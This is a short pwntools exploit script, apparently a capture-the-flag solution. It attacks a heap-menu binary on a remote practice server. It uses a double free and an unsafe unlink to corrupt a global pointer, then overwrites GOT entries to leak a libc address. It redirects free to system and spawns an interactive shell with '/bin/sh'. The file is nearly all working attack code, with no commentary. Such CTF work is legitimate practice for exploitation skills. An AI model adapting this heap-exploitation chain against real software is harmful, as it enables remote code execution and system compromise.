from pwn import *
context.arch='amd64'
elf=ELF('./pwn')
libc=ELF('./libc-2.23.so')
io=remote('node5.buuoj.cn',25573)
#io=process('./pwn')
#io=remote('hnctf.imxbt.cn',53355)


def add(num,content):
    io.recvuntil(b"3. Renew secret\n")
    io.sendline(b'1')
    io.recv()
    io.sendline(str(num).encode())
    io.recvuntil(b"Tell me your secret: \n")
    io.send(content)

def delete(num):
    io.recvuntil(b"3. Renew secret\n")
    io.sendline(b'2')
    io.recvuntil(b"2. Big secret\n")
    io.sendline(str(num).encode())

def show(idx):
    io.recvuntil(b"3. Renew secret\n")
    io.sendline(b'3')
    io.recvuntil(b"please enter idx:\n")
    io.sendline(str(idx).encode())

def edit(num,content) :
    io.recvuntil(b"3. Renew secret\n")
    io.sendline(b'3')
    io.recvuntil(b"2. Big secret\n")
    io.sendline(str(num).encode())
    io.recvuntil(b"Tell me your secret: \n")
    io.send(content)

puts_got=elf.got['puts']
free_got=elf.got['free']
puts_plt=elf.sym['puts']
small=0x6020D0
add(1,b'aaa')
add(2,b'aaa')
delete(1)
add(3,b'aaa')
delete(1)
payload=p64(0)+p64(0x21)+p64(small-0x18)+p64(small-0x10)+p64(0x20)
add(1,payload)
#unlink
delete(2)
payload=p64(0)+p64(puts_got)+p64(0)+p64(free_got)
edit(1,payload)
edit(1,p64(puts_plt))
delete(2)
puts=u64(io.recv(6).ljust(8,b'\x00'))
base=puts-libc.sym['puts']
print('base:',hex(base))
system=base+libc.sym['system']
edit(1,p64(system))
add(2,b'/bin/sh\x00')
delete(2)
io.interactive()
